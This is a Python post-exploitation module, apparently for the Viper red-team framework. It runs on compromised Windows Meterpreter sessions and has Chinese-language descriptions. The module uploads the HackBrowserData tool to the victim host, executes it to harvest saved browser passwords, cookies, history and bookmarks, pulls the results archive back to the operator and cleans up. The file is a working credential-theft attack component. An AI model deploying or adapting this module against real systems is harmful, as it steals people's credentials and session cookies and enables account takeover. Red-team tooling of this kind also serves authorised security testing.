# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFExecPEModule):
    NAME = "获取Windows浏览器密码(Golang)"
    DESC = "模块使用HackBrowserData获取Windows系统浏览器密码/cookie/历史记录/书签.\n" \
           "模块将HackBrowserData的二进制文件上传到目标主机,执行后下载执行结果文件到Viper."
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1081"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1081/", "https://github.com/moonD4rk/HackBrowserData"]
    README = ["https://www.yuque.com/vipersec/module/tzbot0"]
    AUTHOR = "Viper"

    OPTIONS = register_options([])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.set_pepath('hbd.exe')
        self.set_option("RESULTFILE", "hbd_results.zip")
        self.set_option("CLEANUP", True)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows:

            return True, None
        else:
            return False, "此模块只支持Windows的Meterpreter"

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败")
            self.log_error(message)
            return

        format_output = "运行完成,收集到的信息存储在 <文件列表>-<{}> 中".format(message)
        self.log_good(format_output)
